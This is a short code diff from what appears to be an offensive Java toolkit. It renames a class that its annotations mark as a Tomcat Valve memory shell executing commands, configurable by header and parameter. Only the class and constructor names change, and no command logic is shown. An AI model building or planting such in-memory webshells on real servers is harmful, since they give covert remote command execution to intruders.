@@ -17,17 +17,17 @@ import java.lang.reflect.Method;
 @MemShell(MemShell.Valve)
 @MemShellFunction(MemShellFunction.Exec)
 @JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
-public class TomcatValveExec implements InvocationHandler {
+public class ValveExec implements InvocationHandler {
 
     private static String HEADER;
     private static String PARAM;
     private Object targetObject;
     private Object next;
 
-    public TomcatValveExec() {
+    public ValveExec() {
     }
 
-    public TomcatValveExec(Object targetObject) {
+    public ValveExec(Object targetObject) {
         this.targetObject = targetObject;
     }
 
